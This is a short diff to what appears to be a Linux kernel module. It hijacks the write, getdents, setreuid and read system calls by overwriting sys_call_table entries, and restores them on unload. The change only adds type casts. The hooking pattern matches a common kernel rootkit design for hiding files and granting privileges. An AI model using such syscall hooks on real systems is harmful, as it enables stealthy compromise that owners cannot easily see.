@@ -156,7 +156,7 @@ __init init_mod(void){
 	sys_call_table[__NR_write] = (unsigned long) my_write;
 	sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
 	sys_call_table[__NR_setreuid] = (unsigned long) my_setreuid;
-	sys_call_table[__NR_read] = my_read;
+	sys_call_table[__NR_read] = (unsigned long) my_read;
 	
 	//Changing the control bit back
 	PROT_ENABLE;
@@ -192,7 +192,7 @@ __exit exit_mod(void){
 	sys_call_table[__NR_write] = (unsigned long) original_write;
 	sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
 	sys_call_table[__NR_setreuid] = (unsigned long) original_setreuid;
-	sys_call_table[__NR_read] = original_read;
+	sys_call_table[__NR_read] = (unsigned long) original_read;
 	PROT_ENABLE;
 	
 	if (DEBUG == 1) 
